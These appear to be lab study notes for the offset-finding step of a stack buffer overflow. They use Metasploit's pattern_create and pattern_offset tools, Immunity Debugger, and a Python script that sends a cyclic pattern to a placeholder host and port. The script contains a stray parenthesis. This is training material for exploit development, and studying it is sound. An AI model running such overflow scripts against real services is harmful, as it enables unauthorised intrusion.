Run Immunity Debugger
 
Tool:  
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
 
### /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <#_of_bytes_where_cmd_crashed>
 
### Gedit 2.py

#!/usr/bin/python3  
import sys, socket
 
offset = "<output_from_pattern_create.rb>"
 
try:  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("<IP>",<PORT>))  
payload = "<Cmd_to_overflow> /.:/" + offset))  
s.send((payload.encode()))
 
s.close()
 
except:  
print("Error connecting to server")  
sys.exit()
 
### chmod +x 2.py

### ./2.py
 
Find the value of EIP in Immunity Debugger
 
### /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <#_of_bytes_where_cmd_crashed> -q <EIP_value>
 
[+] Exact match at offset ….
 
Use output for next section